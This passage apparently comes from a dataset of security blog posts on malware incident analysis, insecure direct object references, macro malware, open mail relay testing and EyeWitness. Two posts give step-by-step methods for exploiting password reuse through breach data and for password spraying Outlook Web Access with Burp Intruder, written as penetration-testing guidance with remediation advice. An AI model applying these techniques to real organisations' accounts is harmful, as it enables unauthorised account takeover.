crap.  For example, in the Verizon Data Breach report, they found 3% overlap in feeds\u2026  3%!  Further, when it came to malware, they found that 70%-90% of malware specimens were unique to the targeted organization.  I think Eric Conrad (Co-author of SANS 511) said it right, \u201cTwo things: malware wants to persist and it wants to phone home.\u201d  We can focus on those areas and also find lateral movement with tools like Microsoft Advanced Threat Analytics.\n\nNow, there are certain things that do have value and fall under the banner of threat intelligence which does work.  Working with partners in the same industry to share information (NOT A VENDOR!) seems to work very well.  Developing your own internal threat intelligence team has tremendous value.  These things cannot be bought.  You have to work for them.  Intelligence cannot be purchased, only learned.\n\nI have had a number of people email and call to ask if I am Okay. I am Okay. Threat Intelligence feeds did not beat me when I was a child.   I just don't want to see any more organizations throw their money away.\n\n  \u201cNow, John, where on the doll did threat intelligence feeds hurt you?\u201d \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Hacking Like It's 1999\"\nTaxonomies: \"Blue Team, How-To, Hunt Teaming, hacking, old scripts, old stuff\"\nCreation Date: \"Thu, 28 Jan 2016 22:39:50 +0000\"\nLawrence Hoffman //\n\nLast week a friend stopped by my desk with a worried look on his face. He knelt down and showed me the screen of his laptop where there was a virtual terminal open:\n\nAfter looking I asked what the system did, he said it was just a GitLab server for a personal project. I went ahead and killed the process that was still running, then switched the executable bit off on the binaries under the directory referenced above. Thinking it might be something interesting I showed Derek, who was visiting at the office. We helped our friend back up his data from the server and asked if we could have a copy of the software that was dropped on the there, you know, for science. Happy to have had a hand with getting his data off the server our nameless friend agreed to let us have a look, and write about what we\u2019d found.\n\nWe could see where the attackers had pulled their toolkit from, and wanting an original copy of the binaries we went ahead and pulled them down through an anonymizing proxy to a clean Kali instance.\n\nAs a programmer I was interested in the tools. From the above I could see an order of behaviors so I started with the contents of x.tgz. The first thing I wanted to look at was that start script in x.tgz. It turned out to be a bash shell script:\n\nWalking through the script step by step we see that it starts with an error check to see if it was invoked with the correct number of arguments. If not it prints a help message in Romanian \u201cTasteaza: ./start canal\u201d or \u201cType: ./start channel\u201d. Moving on we get a call to ifconfig which parses out the local link addresses and sets a variable to count them. A banner is printed, a quick Google search on the banner brings up an interesting blog post about how nothing has changed in ten years, written in 2013. So, I guess nothing has changed still.\n\nBack to the file: We launch something for each of the link addresses we found. That\u2019s the ./inst file. Let\u2019s have a look.\n\n As we had expected this file is setting up bots. The top of the file is full of \u201cdenominations\u201d the last 52 lines contain the logic that pulls the arguments and denominations to configure the bots. We can see what the argument ronnie was for - it sets up \u201cRonnie\u201d as the channel name. Back in start we get a final few calls. One of them completes the install, the next is to set up the autorun for updates and finally, run the malware. These were pretty basic. The attacker added some iptables rules, created a user named bin, and gave the user root privileges. Finally an email is sent to a Gmail address hardcoded into the rinst.e file, it seems to be mailing out a count of interfaces and a hostname.\n\n The next step our attacker took was to download and run some scripts from a file called \u201cryo\u201d. We had also obtained that file. Again it\u2019s a series of scripts these simply set up psyBNC, which is along the lines of cloaking an IRC connection. The documentation for the project is from 2003 and development was stopped in 2009. Looking through the rest of the launch we see the run file launching an executable called proc, the GCC version is 2.9 and the OS is RedHat 7.1. So, very old.\n\n The attack was rounded out with something called Pydrona. These executables appear to be the most recently compiled (gcc 4.3.4).  One is related to another executable which our attacker had previously deleted: Xhide. The software is meant to hide a process. The other claims to be Drona Turbata 3.0 (Python version).  Which translates to ... \u201cangry drone\u201d from a mix of Italian and Romanian. I\u2019ve not had time to further play with these.\n\nConclusions: Some things never seem to change. The attack that got my friends\u2019 Git server is described in a blog from 2013, where the author is arguing that things haven\u2019t changed since the early 2000s. Here we are in 2016, and I\u2019m looking at very nearly the same binaries. This attack is a recipe, it works in stages, and is almost entirely scripted, and it will continue being used until it stops working, which it clearly hasn\u2019t yet.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Let's Talk About Direct Object References\"\nTaxonomies: \"Red Team, Web App, Direct Object References, HIPAA, HIPAA violations, user profiles, XKCD\"\nCreation Date: \"Wed, 10 Feb 2016 21:44:54 +0000\"\n\nKelsey Bellew //\n\nMaybe you don\u2019t know what Direct Object References mean, if you Google it, you\u2019d get this:\n\nThis description uses the words \u201cdirect\u201d, \u201cobject\u201d and \u201creference\u201d to describe a \u201cdirect object reference\u201d. That\u2019s never a good sign.\n\nLet\u2019s approach this from a different angle.\nSay there\u2019s a website. Say there are users on this website. Say each of these users have an ID number, and that a given user (Bob) has the ID of 123. Say when you view the user Bob, the URL looks like this:\nhttps://www.somesitewithusers.com/users/123\nThat\u2019s a direct object reference. Rephrased, 123 is referencing Bob, who is a user. The user in this case, would be the object. So, a direct object reference.\nIf you change 123 to 124, the web site might show you a different user. If it does, and it\u2019s not a user you were suppose to be able to see, then this is an insecure direct object reference.\nHere\u2019s a real-world example:\n\nThe 1133 I have outlined in red is a direct reference to this specific comic. If you change the number, you change the comic you\u2019re looking at.\nProof (I changed 1133 to 113 and got a different comic):\n\nSo okay, you think you get it. The object here is the comic, the reference is the number (1133 or 113). So is this one of those \u201cInsecure Direct Object References\u201d?\nIs there any reason you shouldn\u2019t be able to see this comic? Or any other comic you could reach using this method that you couldn\u2019t in some other way?\nIf you pay attention while you\u2019re navigating this web site, you\u2019ll notice that every time you hit the \u201cNext\u201d button, that number goes up by one. The 113 turns to 114. If you push the \u201cPrev\u201d button, 113 turns to 112. Because they go in order, there won\u2019t be any pages you can get to by changing the number in the URL that you couldn\u2019t get to by pushing one of the buttons on the page.\nLet\u2019s go back to the first example, where there\u2019s a website with users. Let\u2019s say that instead of viewing Bob\u2019s profile, you click the button to edit your profile. You see that the URL changed to this:\nhttps://www.somesitewithusers.com/edituser/122\nWell, that looks interesting. See that 122? Why does it have a number when you\u2019re editing your profile? The \u201csomesitewithusers.com\u201d is the site. The \u201cedituser\u201d is probably because you clicked on a button that said \u201cEdit Profile\u201d. But why 122?\nRemember Bob? His number was 123, which you saw when you were viewing his profile. What if you change the 122 after \u201c/edituser/\u201d to 123, click enter\u2026\nHey look, it\u2019s Bob! And you see a button to change his name, change his username, maybe change his email and password.\nAnd then you can save the changes.\nNext time you look at Bob\u2019s profile, it has all the changes you made to it. So hey, that seemed insecure, definitely something the website should not have allowed you to do.\nThis won\u2019t happen everywhere. Even if you notice a number that\u2019s referencing a user and you change it to another number, the website can check your credentials to see if you should have access to that page, and then deny you access. The website still utilizes direct object references, but those direct object references are not insecure.\nSo let\u2019s recap. The definition Google gave us was the following:\n\u201c...a direct object reference occurs when a developer exposes a reference to an internal implementation object, such as a file, directory or database key. Without an access control check or other protection, attackers can manipulate these references to access unauthorized data.\u201d\nThe developer is the person who made the website. The \u201cinternal implementation object\u201d would be something like a user or a comic. The only reference we talked about was a number in the URL, but the reference can be other things as well, and in other places. It could have been the name of the comic, or some unique piece of information in the user file, maybe their username or email. The reference could have been in a HTTP Request. Accessing unauthorized data would refer to someone doing something like changing Bob\u2019s profile without being logged in as Bob.\nWhat if you can\u2019t make any changes to some page you find, like the comic example above? Is it ever insecure then? If you can\u2019t make changes, then what\u2019s the problem?\nHere\u2019s one problem: HIPAA.\nIf instead of being able to change Bob\u2019s profile you can just learn what his email and home address are, that\u2019s one thing. It\u2019s a bad thing.\nBut let\u2019s say you\u2019re in a web application with patient information. You can only click on patients within your hospital database; but then you notice when you click on patient records you know were created sequentially, but the numbers in the URL are 124466 and 124470. That doesn\u2019t look right, so you change it to 124467 to see what\u2019s up. Instead, you end up viewing documents on a patient who isn\u2019t in your hospital. That\u2019s a much worse thing.\nAll because of the way the developer decided to store the data. You couldn\u2019t click on the patient because it wasn\u2019t within your range of access, but even so, nothing is stopping you from incrementing twelve hundred thousand patient records. That\u2019s a violation of HIPAA, and that\u2019s very illegal.\nThere are many other kinds of direct object references, insecure and otherwise. There are good reasons to utilize direct object references (comics), and there are good reasons to absolutely never use direct object references (patient information). Think about it the next time you see what seems to be arbitrary numbers in a URL.\n______\nhttps://www.youtube.com/watch?v=ydrtF45-y-g\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Warning: This Post Contains Macros\"\nTaxonomies: \"How-To, InfoSec 101, Average User, BlackEnergy, Education, macros, MS Office, Ukraine\"\nCreation Date: \"Thu, 11 Feb 2016 21:45:54 +0000\"\nLisa Woody //\n\nOn the 23rd of December, a cyber attack left hundreds of thousands of people in the Ukrainian region of Ivano-Frankivsk without power. This was the first confirmed incident of cyber attackers taking down a power grid. Various reports have since indicated that this was a coordinated, sophisticated effort which employed a trojan called BlackEnergy. As someone born and raised in Ukraine, this hit close to home for me. I have since read reports on BlackEnergy and this attack, both by Ukrainian, Russian and American companies, and I couldn\u2019t help but notice something\u2026\nMacros in Microsoft Office documents.\nA simple Google search will show that BlackEnergy has been utilized in Ukraine for the last two years now, frequently for espionage against government targets.  While the actual implementation requires skill, customization, advanced coordination, more than  a little programming ability, the delivery method was always the same - macros in MS Office documents.\n\nUkrainian Excel Document with a Macros Warning\nMacro malware has been around since the 90s, and has recently grown in popularity. Office applications run internal macros written in Visual Basic for Applications (VBA). VBA macros are intended to make your job easier, automating repetitive and time consuming tasks within the office document. However, VBA features like the ability to automatically download files and run applications should trigger red flags for potential abuse. Mix these features with a little social engineering such as an urgent email containing a malicious spreadsheet, and delivering malware into a network becomes a simple task.\nEvery organization is comprised of peripheral employees whose day to day tasks involve using email, editing documents, and being on a computer with access to the company network.  Most people know not to to download and run .exe files.  Microsoft office documents are different. Despite nearly 20 years of these types of attacks, employees are expected to open MS documents when they receive them, especially when they appear to be coming from someone in their organization. It\u2019s almost too easy.\nBefore trying to implement complicated strategies against complex software, companies should mount a concerted effort to educate their employees about these ancient, simple, but extremely effective malware delivery mechanisms. In the world of information security, it\u2019s the simple and overlooked things that cause big problems. That is why we strive to not only find vulnerabilities in our tests, but also to educate those who could encounter these threats on a daily basis through our user awareness training. Afterall, a little knowledge about these simple threats could go as far as preventing a city wide power outage.\nMany are convinced that Russia is behind the attack, and will continue to engage Ukraine in a similar fashion.  But even outside of Eastern Europe, cyber incursions like this one, targeted towards low level employees with very little information security knowledge, are sure to become a primary aspect of future warfare.  Delivery mechanisms for malware will rely on social engineering, leaving countries with a high level of corruption to be at the greatest disadvantage.\nWhile there will always be sophisticated attackers out there who come up with complex malware, this particular attack was brilliant in its simplicity. Let\u2019s make it a little bit harder for bad guys to attack us.\n______\nLisa, originally from Ukraine, is a software engineer at BHIS and in her free time enjoys rock climbing on the awesome routes in the Black Hills of South Dakota. Read more about her here.\n\nWho Wouldn\u2019t Want Their Network to Become a Viral Fishtank??\n\n \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Exploiting Password Reuse on Personal Accounts: How to Gain Access to Domain Credentials Without Being on a Target's Network: Part 1\"\nTaxonomies: \"Author, Beau Bullock, External/Internal, Password Spray, Red Team, domain creds, exploiting passwords, gaining access to domain credentials, passwords, reusing passwords\"\nCreation Date: \"Mon, 15 Feb 2016 21:51:55 +0000\"\nBeau Bullock //\n\nIn this series of posts I am going to detail multiple ways to gain access to domain user credentials without ever being on a target organization's network. The first method involves exploiting password reuse issues where a user might have reused the same password they used for their corporate domain account on another external service. The second method is what I think is a far more interesting way of gathering user credentials that involves discovering a target organization's username schema, followed by password spraying user accounts against an externally facing service that is hosted by the target organization (for example an Outlook Web Access portal). Other methods will follow these posts.\n\nIn part 1, I will detail how an attacker can gain access to corporate domain account credentials by taking advantage of password reuse by an employee on their personal accounts.\n\nThis Article Does Not Involve Sticky Notes\n\nCredential Reuse on Personal Accounts\n\nIndividuals that reuse the same password on multiple web services is a very huge issue. Many people will use the same password for many different services out of the ease of remembering multiple logins across the web. The problem with this is that if a website is compromised and a user reused the same password for their personal account and their corporate account then, potentially, an attacker who has gained access to the personal credential now has access to corporate account credential.\n\nVery commonly when we start to analyze credential leaks for a target organization we typically tend to just look at the domain name owned by the organization. By only looking at the target organization\u2019s domain name one will only gain access to credentials where a target user has used their corporate email address to sign up for an external service. A far more interesting way to go about looking for user credentials involves attempting to locate corporate employees\u2019 personal accounts that have been part of a third-party compromise. This can be a very difficult task provided the many services that are available for users to sign up for email (Yahoo, Gmail, etc.). The difficulty of locating a user's personal account can be decreased when the target organization itself has a service that offers personal accounts.\n\nFor example, think about an organization like Google who has gmail.com. It's safe to think that employees of Google potentially have a gmail.com account. On a recent engagement I had the opportunity of testing a company that also offered a similar service where they offer email addresses to their customers. Pwnedlist.com is one of a few sites that collects the information dumped publicly from various data breaches. They have a service that allows users to submit email addresses and determine if that address was associated with a data breach. Pwnedlist also accepts domain names. When submitting a domain name to Pwnedlist the site will tell you how many accounts from that target domain were part of various breaches. When I ran the target organization\u2019s domain through a Pwnedlist.com search I found the domain used by the customers of the target organization had over 50,000 accounts that were part of various data breaches as recent as a few days before I began the assessment.\n\n I spoke with the target organization about the potential of their own employees having accounts that were technically personal accounts they set up as a customer of the target organization. They were in agreement that this was a possibility. The organization was rightly interested in which of their customers have been part of a data breach, and they requested that I provide this data. I proceeded to gather this information from Pwnedlist.\n\nThis got me thinking about the potential for analyzing and correlating whether an employee\u2019s personal account credentials that are part of a previous compromise align with their actual corporate account credentials. Could I actually cross reference a user's personal account credential back to their corporate account, and potentially login using the same credentials that they used on their personal account? (Just to clarify I am not attempting to login to, or utilize an individual\u2019s personal account. The goal is to see if the password they used on a third-party site that was part of a breach was reused on their corporate account login.)\n\nAfter gaining access to 50,000 personal email addresses, and potential credentials for those personal email addresses, one must then find a way to relate those email addresses to actual people and then potentially relate them to corporate email addresses. The problem with sites that allow users to create their own email address is that the address name is at the discretion of the user. So, in my case I ended up getting credentials from Pwnedlist for accounts that looked similar to \u201cAlpacas4Eva@targetorg.net\u201d.\n\nIn order to determine whether Alpacas4Eva@targetorg.net belongs to an actual employee of the target organization one needs to be able to take that email address and figure out who exactly it belongs to. To do this I used the Pipl.com search engine. Pipl.com will accept an email address and provide a ton of information that they have gathered from many different social media and news sites around the web. For example, you can submit an email address and they might be able to provide details they gathered from sites like LinkedIn, Facebook, etc.\n\nThis information generally will include a full name of a person if they posted it somewhere on the Internet. Also, a \u2018Career\u2019 field potentially details where someone has said they work somewhere on the Internet, maybe on LinkedIn.\n\nUsing Burp Suite\u2019s Intruder functionality (sidenote: I\u2019m working on turning this into a Recon-ng module) I submitted over 50,000 email addresses that were technically personal email accounts of customers of my target organization to pipl.com\u2019s search engine. I then grepped the responses from Pipl for the \u2018Career\u2019 field looking for the title of the company itself. On the Options tab of Burp Intruder you can add in custom fields to grep for. I removed all of the other default fields and added in the company name of the target organization.\n\nBurp now tells us whether the response contained the company name or not. This helps us narrow down the possible matches for employees.\n\nManagers never reuse their passwords right?\n\nOut of the 50,000 email addresses that I submitted to Pipl I actually ended up with 252 hits that appeared to be employee\u2019s personal accounts. After finding these 252 potential personal accounts of employees the task then becomes to convert them into the organization\u2019s email standard. If Pipl was able to find the full name of the individual whose personal email account I submitted was associated with, then it shouldn\u2019t be too difficult to mangle their name into a corporate email address (i.e. firstname.lastname@targetorganization.net).\n\nFor this particular target organization I was able to find other valid email addresses during reconnaissance so it was very easy for me to discover the schema. I was able to then convert what appeared to be personal employee accounts to corporate email account addresses. I also had credentials for these accounts from Pwnedlist. The next step was to simply go attempt to login to an external portal (like Outlook Web Access) with these credentials that were part of a third-party breach. If an employee of the target organization had reused the same password they used for their personal account, then we now have access to a valid domain account.\n\n....and we\u2019re in... to Mr. John Doe\u2019s email.\n\nJust to recap, the steps of this approach to gathering user credentials follows:\n\nGather credentials of personal accounts associated with a target organization through public data breaches. Sites like Pwnedlist host services for gathering these. \n\nSubmit these personal email addresses to Pipl and grep the results for the company name. This is to help locate individuals who said they work at the target company on the Internet and Pipl was able to correlate a personal account to them. \n\nAfter crafting a list of potential employee\u2019s personal accounts use the information gathered about them from Pipl to craft potential corporate email accounts. \n\nPotentially, you now have email addresses and passwords of corporate accounts if credential reuse was occurring. \n\nRecommendations\n\nIntroduce your users to password managing services. The best defense against this is to make your users stop using the same passwords everywhere. \n\nIn the next part of this two-part article, I will detail how an attacker can discover a target organization\u2019s username schema and perform password spraying attacks against an externally facing service. You can read it HERE.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Password Spraying Outlook Web Access - How to Gain Access to Domain Credentials Without Being on a Target's Network: Part 2\"\nTaxonomies: \"Author, Beau Bullock, Recon, Red Team, domain credentials, domain creds, password spraying, passwords\"\nCreation Date: \"Wed, 17 Feb 2016 21:54:48 +0000\"\nBeau Bullock //\n\nThis is part two of a series of posts (See part 1 here) where I am detailing multiple ways to gain access to domain user credentials without ever being on a target organization's network. The first method involves exploiting password reuse issues where a user might have reused the same password they used for their corporate domain account on another external service. The second method is what I think is a far more interesting way of gathering user credentials that involves discovering a target organization's username schema, followed by password spraying user accounts against an externally facing service that is hosted by the target organization (for example an Outlook Web Access portal). Other methods will follow these posts.\n\nIn part 2, I will detail how an attacker can discover a target organization\u2019s username schema and perform password spraying attacks against an externally facing service.\n\nThe Dangers of Metadata and Publicly Facing Authentication Services\n\nVery commonly on assessments, we tend to look for documents that are hosted by a target organization and are publicly available to download. The reason we do this is that we find that very commonly organizations do a very bad job of scrubbing the metadata attached to the items they post publicly. Some very interesting things can be found in the metadata that gets attached to files.\n\nFor example, if you take a photo with your cell phone and you have GPS enabled, many times that GPS location information will be attached to the picture itself. From an operational security perspective if you were to take a photo of a secure location and have GPS enabled, then posting that picture online might reveal the actual coordinates of the location you took the photo.\n\n New Profile Pic! \n\nWhen we look at analyzing metadata of Word documents, Excel files, PDFs, PowerPoint presentations, and more that organizations post publicly,  we find very often that we can actually gain access to computer names, folder structures, as well as user names of those that created the files themselves. A great tool for quickly finding metadata and analyzing it in publicly available files of a target organization is called FOCA.\n\nYou can download FOCA here: https://www.elevenpaths.com/labstools/foca/index.html\n\nFOCA simply performs Google and Bing searches with the \u201cfiletype\u201d parameter. You can provide Google with a search like the following to search for all of the PDF files associated with the \u201ctargetorganization.net\u201d domain: \u201csite:targetorganization.net filetype:doc\u201d. If you provide FOCA a target domain it starts with the top-level domain and will subsequently find other subdomains where potential files are located. FOCA will then download any of these files and analyze the metadata attached to the files.\n\nOn a recent engagement, I ran FOCA against the domain of the target organization that I was testing. When I looked at the metadata that FOCA was able to gather from the files that were being hosted publicly I found a large number of what appeared to be user names. In fact, I was able to discover what appeared to be their actual naming convention. This naming convention did not appear to be random or hard to guess at all. What I mean by that is that I was able to very easily craft a list of every possible combination of their username schema.\n\nFor example, imagine a username schema that starts out each username with the word \u2018emp\u2019, and then simply appends the three-letter initials of the employee (abc). So a possible full username would be \u2018empabc\u2019. The total number of three-character permutations of the letters \u2018a\u2019 through \u2018z\u2019 is 17,576. So, to hit every possible username combination from \u2018empaaa\u2019 through \u2018empzzz\u2019 is 17,576. I generated a list containing each of the possible permutations.\n\nPassword Spraying Outlook Web Access\n\nSo, now that I had a list of possibly every username combination for the target organization what could I do next as an external attacker? Next, an external attacker would have to locate some sort of external service that performs domain-based authentication. One such service that does this that we find very often is Microsoft\u2019s Outlook Web Access (OWA). Organizations provide the ability for their employees to access their email remotely through services like OWA. The authentication that happens when a user logs into OWA is typically domain-based, meaning that the credential used to authenticate is checked against the domain for validity.\n\nAfter locating an external OWA portal an attacker could brute force passwords, but will quickly lockout accounts if a lockout threshold is in place. A far more superior way of performing password attacks is called password spraying. Password spraying involves attempting to log in with only one (very strategically chosen) password across all of the domain accounts. This allows an attacker to attempt many more authentication attempts without locking out users. For example, if I were to attempt to login to every account with the password \u2018Winter2016\u2019 it is very likely that someone at the target organization used that password and I will now have access to their account.\n\nSome things to consider when performing an external password spray attack:\n\n Be extremely mindful of lockout thresholds! If you submit too many bad passwords in a given amount of time you are going to lock accounts out. Without being on the target network it is impossible to know exactly what the domain account policy enforces. \n\n That being said, by default Windows default domain account policy does not enforce a lockout of any kind. This means that technically you could brute force any user\u2019s password without locking them out. I have yet to run into an environment that does not have some sort of lockout policy. Very commonly I find that environments set their lockout policy to five (5) failed logins within a 30-minute observation window. \n\n Just use one password for spraying every two hours. This is a reasonable window that will likely not get you into a situation where you are locking out accounts. \n\n Be in close contact with your point of contact at the company to verify you are not locking anyone out. \n\nI once again used Burp Suite\u2019s Intruder functionality to submit one login attempt for each possible username using one password. Performing a password attack in this manner limits the risk of locking out accounts as only a single login attempt is performed for each account. For example, BHIS submitted the userID \u2018targetorg\\empaaa\u2019 with a password of \u2018Winter2015\u2019. After this attempt, the same password would be tried with \u2018targetorg\\empaab\u2019, and continue on all the way to \u2018targetorg\\empzzz\u2019.\n\nTo do this I first setup Burp Suite to intercept all of the requests leaving my browser. I attempted to login to the OWA portal with a userID of \u2018targetorg\\test\u2019 and a password of \u2018Testing123\u2019. The POST request to the OWA portal looked like the following:\n\nI then sent this request to Intruder. For this first example, we will leave the attack type as \u2018Sniper\u2019. In Burp Intruder I specified only one payload position. The username is all that is going to change during the attack so this is where we add the payload position. The password will remain \u2018Testing123\u2019 or whatever you set it to be (I highly recommend season and year like \u2018Winter2015\u2019).\n\n On the payloads tab, I now imported the list of probable usernames I generated.\n\nOne thing I noticed was that Outlook Web Access responds to the POST request by simply setting a cookie in the browser and redirecting to the root \u201c/\u201d page. OWA did this for every login attempt regardless of whether the login was valid or not. So, in order for Burp to follow through with the authentication process, we need to set one more setting before launching the attack. On the Options tab of Burp Intruder at the very bottom select the option to \u201cFollow redirections\u201d for \u201cOn-Site only\u201d. Also, click the checkbox to \u201cProcess cookies in redirections\u201d.\n\nStarting the attack now one can see where Burp Intruder is following each of the redirects that occur during the authentication process to OWA. The only thing left to do is to sort by the length of the response as valid authentication attempts responded with a shorter response length. In the screenshot below OWA redirects four times before hitting a page indicating a successful login.\n\nI ultimately was able to gain access to a large number of accounts via this technique. As can be seen in the screenshot below the requests that generated a response length of around 4371, and 1630 were valid user credentials. The requests that generated a response length of 12944 were failed login attempts.\n\nIn the scenario I\u2019ve demonstrated above I was utilizing the \u2018Sniper\u2019 functionality in Burp. This was mainly to avoid account lockout and only change the userID field. Being in close contact with my target organization I knew what the actual lockout threshold was as well as the observation window. In order to maximize the effectiveness of my password spraying, I utilized Burp Intruder\u2019s \u201cCluster Bomb\u201d attack. With the Cluster Bomb attack, you can specify two payload positions. I selected the username and password fields as my payload positions.\n\nCluster Bomb will also allow you to specify two lists to use with each payload position. So I left the username position the same as previously with my list of potential users. I then crafted a list of 10 or so passwords that I thought would work nicely to password spray with.\n\nThe Cluster Bomb attack will now iterate through all of the usernames with one of these passwords at a time. Once the spray is done for one password it will move onto the next. For example, the spray would go through the entire username list with a password of Winter15, then after that spray is finished it would move onto Winter16. With my list of 17575 usernames, the time it took to spray the entire list with one password was far out of the observation window in terms of lockout so I didn\u2019t have anything to worry about there.\n\nIn the example I gave above I was currently assigned to perform an external network assessment and an internal pivot assessment for the target organization. After password spraying externally over the weekend before I was scheduled to begin the internal pivot assessment I gained access to a total of 130 valid user credentials. The target organization did not detect any of the password spraying activity through their external portal. It is probably safe to say that an attacker could password spray for weeks on end gaining access to many more accounts via this technique.\n\nIn this post, I focused on password spraying against OWA specifically. There are many other services that this same type of attack could apply to. For example, an attacker can perform password spraying attacks against Microsoft RDP servers, SMTP servers, SSL VPNs, and more. A great tool for doing this against most of these services is called Patator and can be found here: https://github.com/lanjelot/patator\n\nJust to recap, the steps of this approach to gathering user credentials follow:\n\nLocate publicly available files with FOCA on websites of the target organization.\n\nAnalyze the metadata from those files to discover usernames and figure out their username convention.\n\nCraft a list of their entire possible username space.\n\nPassword spray against an external system that performs domain authentication (like Outlook Web Access) using the username list you generated.\n\nProfit?\n\nRecommendations:\n\nAnalyze all of the documents your organization is hosting publicly for information leakage via metadata. \n\nImplement policies and procedures to scrub the metadata from anything that is going to be posted publicly. \n\nWatch your OWA and any other external authentication portals for multiple failed login attempts and password spraying activity. \n\nCreate stronger password policies beyond the default 8 characters (we typically recommend 15 or more). \n\nForce users to use two-factor authentication. In the event someone does password spray a user if two-factor authentication is enabled they won\u2019t gain access to much. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Test for Open Mail Relays\"\nTaxonomies: \"External/Internal, Red Team, Carrie Roberts, external network assessment, mail relays, mail servers, pen-testing, penetration testing, Pentesting, testing for open mail relays\"\nCreation Date: \"Thu, 18 Feb 2016 22:00:30 +0000\"\nCarrie Roberts // *Guest Blog\n\nIt is important to ensure that your external mail servers are properly configured to not support open relaying of mail. An open mail relay can be abused by spammers, eating up your resources and landing you on a blacklist. It is not too common to find completely open mail relays these days because they get abused, thus inspiring them to be fixed.\n\nBut what is common is to find is what I call a \u201cPartially Open Mail Relay\u201d. This occurs when the mail relay can be used to do one of the following:\n\nSend email from an external source address to an internal destination address.\n\nSend email from an internal source address to an internal destination address.\n\nThis is quite useful for an attacker developing an email phishing campaign against internal users. Imagine an email to all employees appearing to come from the CSO. Exploiting the partially open mail relay makes the email appear genuine so that employees have no visual indication that this is not truly from the CSO. If the employee\u2019s email client is telling them it came from the CSO and the source email address confirms this, they are more likely to trust that it actually did. None of the usual \u201cthis is a phish\u201d clues, such as the use of a look-a-like domain name are present.\n\nUnfortunately, vulnerability scanners do not do a good job of detecting this vulnerability, if they even detect it at all. So to be sure, you need to test it yourself, and this is how you can do it.\n\nUse a telnet or netcat client to connect to the mail server port. There is a gotcha here to watch out for. The mail server port is typically port 25 and many home Internet Service Providers block this port. This means that when you try to connect, it will time out. Two examples of failing to connect for this reason are shown below. The first is an attempt with the telnet client and the second is an attempt to connect with the netcat client.\n\nYou can check if your port 25 is open for communication on windows with the following PowerShell command.\n\npowershell (New-Object System.Net.Webclient).DownloadString('http://open.zorinaq.com:25')\n\nIf you get a response other than \u201cYep, port 25 is open\u201d you may have filtering going on and you\u2019ll need to do this testing from a different network location.\n\nNow that we know we can communicate on port 25 we can use the following commands to test for open mail relays. In the example below, the blue text shows what you should enter on the command-line and green text shows the command output or server response.\n\nThe commands above are just an example and as it turns out, a bad one for testing open mail relays. This is because example.com is actually a special case configured into some mail servers for testing. It will pretend to accept the message for delivery but it actually doesn\u2019t.  So when you want to test on open mail relay, use a different domain than example.com. The first thing you should check is if mail can be relayed from an external email address to an external email address as shown below.\n\nTest: External Source Address, External Destination Address\n\nMAIL FROM: \n\nRCPT TO: \n\nNext, check to see if you can relay mail using an external source email address and an internal destination address.\n\nTest: External Source Address, Internal Destination Address\n\nMAIL FROM: \n\nRCPT TO: \n\nLast, check to see if you can relay mail using an internal source email address and an internal destination address.\n\nTest: Internal Source Address, Internal Destination Address\n\nMAIL FROM: \n\nRCPT TO: \n\nYou should repeat this last test to ensure you have used both an existing internal source address and a non-existing internal source address. This is because some mail servers may be configured to require authentication for an existing user but it may be possible to bypass this protection by using a non-existent internal source address such as does.not.exist@blackhillsinfosec.com in our example.\n\nCheck this on all your mail servers, as each may be configured differently. This is how you can use the Linux dig command to list the mail servers for your domain. Or for Windows, try nslookup.\n\ndig @8.8.8.8 blackhillsinfosec.com -t MX \n\nThere is also a Metasploit module that can test for mail relaying here.\n\nAnd finally, here are some suggestions for how to remediate any issues you find. The simple answer is to configure your mail server to not relay mail, but business requirements may require mail relaying from trusted third parties. In this case, consider implementing one of the following controls, with the first being the preferred solution:\n\nRequire authentication with user accounts and encryption through STARTTLS. \n\nConfigure the email gateway to only allow the IP addresses of the email gateways themselves and authorized IP addresses to send. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"EyeWitness and Why It Rocks\"\nTaxonomies: \"Author, Brian Fehrman, External/Internal, Red Team, EyeWitness, Pentesting, vulnerability scans\"\nCreation Date: \"Mon, 22 Feb 2016 22:02:58 +0000\"\nBrian Fehrman //\n\nExternal and Internal vulnerability scans are often part of any penetration test. Automated scanning tools, however, can\u2019t always find the \u201cgood stuff.\u201d Many times, some of the worst things that we find are in the results marked as Low-Severity or Informational in nature. It can be as easy as just visiting a web service that is exposed and finding that the default credentials haven\u2019t been changed. As an attacker, why bother exploiting a system when they can just login with credentials that were found with a quick Google search? How about systems with no authentication?\n\nFor larger scans, it might not be feasible to manually visit every web service that is exposed. That is where tools like EyeWitness come in! There are other tools that perform similar tasks, such as RAWR and Peeping Tom. I encourage you to check those out as well. I am in no way biased towards EyeWitness other than that is what I picked up and it does everything that I would like. It allows you to feed in a list of web addresses or, more often for me, a Nessus file directly exported from a Nessus server. It will automatically visit the web services that were found, take screenshots, and generate a nifty report for you in HTML format. All you have to do is scroll through the report and see which websites look interesting. It\u2019s very helpful in quickly finding the \u201cgood stuff.\u201d\n\nTo use EyeWitness on a Kali box, start by cloning the repository.\n\nEnter the directory and run the setup file.\n\nIf you want to feed in a Nessus file, first export it from your Nessus server to a .nessus format.\n\nMove the Nessus file onto your Kali box. I like to put it in the EyeWitness directory. Then, issue the command to process the file. I run it with a timeout of 30 seconds, 15 threads, and tell it to use Selenium to perform the screenshots (--web flag).\n\nBelow is a sample of the report that is generated.\n\nAs you can see, this can be extremely valuable for both pentesters and network administrators. Quickly find the \u201cgood stuff\u201d or determine just what is running on your network.\n\nJoin the BHIS Blog Mailing List \u2013 get notified when we post new blogs, webcasts, and podcasts.\n\n[jetpack_subscription_form show_only_email_and_button=\"true\" custom_background_button_color=\"undefined\" custom_text_button_color=\"undefined\" submit_button_text=\"Subscribe\" submit_button_classes=\"undefined\" show_subscribers_total=\"true\" ]\n\n"
    },
    {
        "input": "",
        "instruction": "",
